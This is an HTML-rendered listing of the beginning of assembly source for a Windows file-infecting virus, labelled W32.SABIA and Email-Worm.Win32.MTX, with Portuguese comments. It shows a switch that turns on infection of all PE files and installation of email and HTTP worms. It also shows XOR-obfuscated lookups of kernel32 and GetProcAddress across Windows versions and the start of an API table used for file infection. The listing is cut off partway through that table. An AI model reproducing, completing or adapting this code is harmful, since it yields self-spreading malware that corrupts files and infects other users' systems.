<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.MTX - SABIA.ASM.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
	background: #FFFFCC;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                        W32.SABIA (beta)</span><span class="sc0">


   </span><span class="sc2">.386p</span><span class="sc0">
   </span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
   </span><span class="sc9">.code</span><span class="sc0">
   </span><span class="sc5">jumps</span><span class="sc0">

   </span><span class="sc9">include</span><span class="sc0"> \</span><span class="sc5">VIRUS</span><span class="sc0">\</span><span class="sc5">TASM50</span><span class="sc0">\</span><span class="sc9">INCLUDE</span><span class="sc0">\</span><span class="sc5">SABIA.INC</span><span class="sc0">

   </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0"> </span><span class="sc1">; TRUE = message box about infected files,</span><span class="sc0">
                  </span><span class="sc1">; and will just copy the worms to the windows</span><span class="sc0">
                  </span><span class="sc1">; folder (not install). Only GOAT*.* files are</span><span class="sc0">
                  </span><span class="sc1">; infected.</span><span class="sc0">

                  </span><span class="sc1">; FALSE = no alert about the infection, infect all PE</span><span class="sc0">
                  </span><span class="sc1">; files.</span><span class="sc0">
                  </span><span class="sc1">; and will install the 2 worms (email and http).</span><span class="sc0">


   </span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pushf</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">233</span><span class="sc0">
   </span><span class="sc5">maybe@001</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc1">; achar os endereços das api's (funciona em W95/98 ,NT e 2000)</span><span class="sc0">
   </span><span class="sc1">; o arquivo precisa ter importado a api GetProcAddress()</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

   </span><span class="sc1">; imagebase do arquivo (este valor mudará de arquivo p/ arquivo)</span><span class="sc0">

   </span><span class="sc5">img_base0</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">00400000h</span><span class="sc0">

   </span><span class="sc5">api@001</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">api@003</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc5">saida@001</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">saida@002</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">popf</span><span class="sc0">

   </span><span class="sc1">; o codigo real do arquivo (antes da infecção)</span><span class="sc0">
   </span><span class="sc1">; no futuro vai ter encriptaçao, mas por enquanto</span><span class="sc0">
   </span><span class="sc1">; fica assim mesmo [aproveitem AV ;) ]</span><span class="sc0">

   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">25ffh</span><span class="sc0">
   </span><span class="sc5">chamada@001</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sabia@memory</span><span class="sc0">

   </span><span class="sc5">api@003</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">52</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">saida@001</span><span class="sc0">

   </span><span class="sc5">api@004</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc0">

   </span><span class="sc1">; eax apontando p/ import table</span><span class="sc0">
   </span><span class="sc1">; ebp contem a imagebase</span><span class="sc0">

   </span><span class="sc1">; a entrada da import table esta em esi</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

   </span><span class="sc1">; o limite da import table esta em edi</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc1">; primeira entrada na import table</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'NREK'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'NBK'</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'ANA'</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'NBK'</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'ANA'</span><span class="sc0">

   </span><span class="sc5">api@007</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">api@006</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">api@007</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">saida@001</span><span class="sc0">

   </span><span class="sc1">; api's importadas pelo KERNEL achadas</span><span class="sc0">

   </span><span class="sc5">api@006</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">saida@001</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc1">; ecx contem o numero de vezes para o loop</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc5">api@009</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">saida@001</span><span class="sc0">

   </span><span class="sc1">; cmp byte ptr [esi+3], 128</span><span class="sc0">
   </span><span class="sc1">; je api@008</span><span class="sc0">
   </span><span class="sc6">lodsd</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'PteG'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'NBK'</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'ANA'</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'&lt;:-P'</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'NBK'</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'ANA'</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'&lt;:-P'</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">api@008</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'PteG'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'Acor'</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">api@008</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

   </span><span class="sc1">; pronto, GetProcAddress em [edi]</span><span class="sc0">
   </span><span class="sc1">; tentar primeiro o NT, depois W95 e depois W2000</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">api@010</span><span class="sc0">

   </span><span class="sc1">; Beep() é uma api presente em todos os sistemas e é</span><span class="sc0">
   </span><span class="sc1">; uma palavra bem pequena ;)</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Beep'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc5">api@010</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">077F00000h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'NBK'</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'ANA'</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'AUUA'</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'NBK'</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'ANA'</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'AUUA'</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">api@011</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">api@012</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">077F00000h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0BFF70000h</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">api@011</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">api@012</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BFF70000h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">077E0000h</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">api@011</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">api@012</span><span class="sc0">

   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">saida@001</span><span class="sc0">

   </span><span class="sc5">api@011</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">api@008</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">saida@001</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">api@009</span><span class="sc0">

   </span><span class="sc5">api@012</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">; KERNEL em ebx e GetProcAddress em [edi]</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">api@014</span><span class="sc0">

   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc5">api@014</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">api@013</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'DeleteFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetFileSize'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetFileAttributesA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateFileMappingA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'UnmapViewOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindClose'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetDriveTypeA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CopyFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Sleep'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetWindowsDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetSystemDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetFileAttributesA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetFilePointer'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetEndOfFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetSystemTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'lstrlen'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'lstrcat'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'VirtualAlloc'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateMutexA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateThread'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetStartupInfoA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateProcessA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'LoadLibraryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetProcAddress'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetFileTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetFileTime'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetTempPathA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'lstrcpyA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'K'</span><span class="sc0">

   </span><span class="sc5">api@013</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">api@015</span><span class="sc0">

   </span><span class="sc5">FindFirstFileA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">FindNextFileA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">DeleteFileA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">GetFileSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">SetFileAttributesA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">CreateFileMappingA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">MapViewOfFile</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">UnmapViewOfFile</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">CreateFileA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">CloseHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">FindClose</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">GetDriveTypeA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">CopyFileA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">Sleep</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">GetFileAttributesA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">SetFilePointer</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">SetEndOfFile</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">GetSystemTime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">lstrlen</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">lstrcat</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">VirtualAlloc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">CreateMutexA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">CreateThread</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">GetStartupInfoA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
